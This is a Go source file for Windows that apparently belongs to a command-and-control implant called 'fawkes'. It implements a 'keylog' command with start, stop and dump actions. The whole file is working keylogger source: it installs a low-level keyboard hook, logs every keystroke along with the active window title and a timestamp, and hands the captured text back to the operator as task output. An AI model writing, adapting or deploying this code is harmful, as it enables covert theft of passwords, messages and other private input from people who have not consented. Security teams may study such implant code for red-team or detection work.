//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"fawkes/pkg/structs"
)

// Win32 constants for keyboard hook
const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_SYSKEYDOWN  = 0x0104
)

// KBDLLHOOKSTRUCT represents the keyboard hook data
type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// MSG structure for GetMessage
type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

var (
	user32KL = windows.NewLazySystemDLL("user32.dll")

	procSetWindowsHookExW   = user32KL.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx = user32KL.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx      = user32KL.NewProc("CallNextHookEx")
	procGetMessageW         = user32KL.NewProc("GetMessageW")
	procGetKeyNameTextW     = user32KL.NewProc("GetKeyNameTextW")
	procGetForegroundWindow = user32KL.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32KL.NewProc("GetWindowTextW")
	procPostThreadMessageW  = user32KL.NewProc("PostThreadMessageW")
)

// keylogState holds the global keylogger state
type keylogState struct {
	mu         sync.Mutex
	running    bool
	hookHandle uintptr
	buffer     strings.Builder
	lastWindow string
	threadID   uint32
	startTime  time.Time
	keyCount   int
}

var kl = &keylogState{}

type KeylogCommand struct{}

func (c *KeylogCommand) Name() string {
	return "keylog"
}

func (c *KeylogCommand) Description() string {
	return "Start/stop/dump a low-level keyboard logger"
}

type keylogArgs struct {
	Action string `json:"action"`
}

func (c *KeylogCommand) Execute(task structs.Task) structs.CommandResult {
	var args keylogArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: action required. Use: start, stop, dump",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "start":
		return keylogStart()
	case "stop":
		return keylogStop()
	case "dump":
		return keylogDump()
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: start, stop, dump", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func keylogStart() structs.CommandResult {
	kl.mu.Lock()
	if kl.running {
		kl.mu.Unlock()
		return structs.CommandResult{
			Output:    "Keylogger is already running",
			Status:    "error",
			Completed: true,
		}
	}
	kl.running = true
	kl.buffer.Reset()
	kl.lastWindow = ""
	kl.startTime = time.Now()
	kl.keyCount = 0
	kl.mu.Unlock()

	// Start the hook in a new goroutine
	started := make(chan error, 1)
	go keylogLoop(started)

	// Wait for the hook to be installed
	if err := <-started; err != nil {
		kl.mu.Lock()
		kl.running = false
		kl.mu.Unlock()
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error starting keylogger: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    "Keylogger started. Use 'keylog -action dump' to view captured keystrokes, 'keylog -action stop' to stop.",
		Status:    "success",
		Completed: true,
	}
}

func keylogStop() structs.CommandResult {
	kl.mu.Lock()
	if !kl.running {
		kl.mu.Unlock()
		return structs.CommandResult{
			Output:    "Keylogger is not running",
			Status:    "error",
			Completed: true,
		}
	}

	// Post WM_QUIT to the message loop to stop it
	if kl.threadID != 0 {
		procPostThreadMessageW.Call(uintptr(kl.threadID), 0x0012, 0, 0) // WM_QUIT = 0x0012
	}

	output := kl.buffer.String()
	duration := time.Since(kl.startTime)
	keyCount := kl.keyCount
	kl.running = false
	kl.buffer.Reset()
	kl.mu.Unlock()

	// Wait briefly for the hook to unhook
	time.Sleep(200 * time.Millisecond)

	result := fmt.Sprintf("Keylogger stopped.\nDuration: %s\nKeystrokes captured: %d\n\n--- Captured Keystrokes ---\n%s",
		duration.Round(time.Second), keyCount, output)

	return structs.CommandResult{
		Output:    result,
		Status:    "success",
		Completed: true,
	}
}

func keylogDump() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return structs.CommandResult{
			Output:    "Keylogger is not running",
			Status:    "error",
			Completed: true,
		}
	}

	output := kl.buffer.String()
	duration := time.Since(kl.startTime)

	if output == "" {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Keylogger running for %s — no keystrokes captured yet", duration.Round(time.Second)),
			Status:    "success",
			Completed: true,
		}
	}

	result := fmt.Sprintf("Keylogger running for %s — %d keystrokes captured\n\n--- Captured Keystrokes ---\n%s",
		duration.Round(time.Second), kl.keyCount, output)

	return structs.CommandResult{
		Output:    result,
		Status:    "success",
		Completed: true,
	}
}

// keylogLoop runs the keyboard hook message pump
func keylogLoop(started chan<- error) {
	// Get current thread ID for PostThreadMessage
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procGetCurrentThreadId := kernel32.NewProc("GetCurrentThreadId")
	tid, _, _ := procGetCurrentThreadId.Call()
	kl.mu.Lock()
	kl.threadID = uint32(tid)
	kl.mu.Unlock()

	// Install the low-level keyboard hook
	hookHandle, _, err := procSetWindowsHookExW.Call(
		WH_KEYBOARD_LL,
		windows.NewCallback(keyboardHookProc),
		0,
		0,
	)
	if hookHandle == 0 {
		started <- fmt.Errorf("SetWindowsHookExW failed: %v", err)
		return
	}

	kl.mu.Lock()
	kl.hookHandle = hookHandle
	kl.mu.Unlock()

	started <- nil

	// Message pump — required for the hook to work
	var msg MSG
	for {
		ret, _, _ := procGetMessageW.Call(
			uintptr(unsafe.Pointer(&msg)),
			0,
			0,
			0,
		)
		// GetMessage returns 0 for WM_QUIT, -1 for error
		if ret == 0 || int32(ret) == -1 {
			break
		}
	}

	// Unhook
	procUnhookWindowsHookEx.Call(hookHandle)
	kl.mu.Lock()
	kl.hookHandle = 0
	kl.mu.Unlock()
}

// keyboardHookProc is the callback for the keyboard hook
func keyboardHookProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		kbData := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))

		// Get foreground window title for context
		currentWindow := getForegroundWindowTitle()

		kl.mu.Lock()

		// Log window change
		if currentWindow != kl.lastWindow && currentWindow != "" {
			kl.buffer.WriteString(fmt.Sprintf("\n[%s] --- %s ---\n",
				time.Now().Format("15:04:05"), currentWindow))
			kl.lastWindow = currentWindow
		}

		// Translate virtual key to readable string
		keyName := vkToString(kbData.VkCode, kbData.ScanCode)
		kl.buffer.WriteString(keyName)
		kl.keyCount++

		kl.mu.Unlock()
	}

	// Always call next hook
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

// getForegroundWindowTitle returns the title of the active window
func getForegroundWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}

	buf := make([]uint16, 256)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
	return windows.UTF16ToString(buf)
}

// vkToString converts a virtual key code to a human-readable string
func vkToString(vkCode, scanCode uint32) string {
	// Special keys
	switch vkCode {
	case 0x08:
		return "[BS]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]\n"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x25:
		return "[LEFT]"
	case 0x26:
		return "[UP]"
	case 0x27:
		return "[RIGHT]"
	case 0x28:
		return "[DOWN]"
	case 0x2E:
		return "[DEL]"
	case 0x10, 0xA0, 0xA1: // Shift
		return ""
	case 0x11, 0xA2, 0xA3: // Ctrl
		return ""
	case 0x12, 0xA4, 0xA5: // Alt
		return ""
	case 0x5B, 0x5C: // Windows key
		return "[WIN]"
	case 0x14: // Caps Lock
		return "[CAPS]"
	}

	// Function keys
	if vkCode >= 0x70 && vkCode <= 0x7B {
		return fmt.Sprintf("[F%d]", vkCode-0x6F)
	}

	// Use GetKeyNameText for other keys
	lParam := int32(scanCode) << 16
	buf := make([]uint16, 64)
	ret, _, _ := procGetKeyNameTextW.Call(
		uintptr(lParam),
		uintptr(unsafe.Pointer(&buf[0])),
		64,
	)
	if ret > 0 {
		name := windows.UTF16ToString(buf)
		if len(name) == 1 {
			return name
		}
		return fmt.Sprintf("[%s]", name)
	}

	// Fallback: printable ASCII range
	if vkCode >= 0x30 && vkCode <= 0x5A {
		return string(rune(vkCode))
	}

	return fmt.Sprintf("[0x%02X]", vkCode)
}
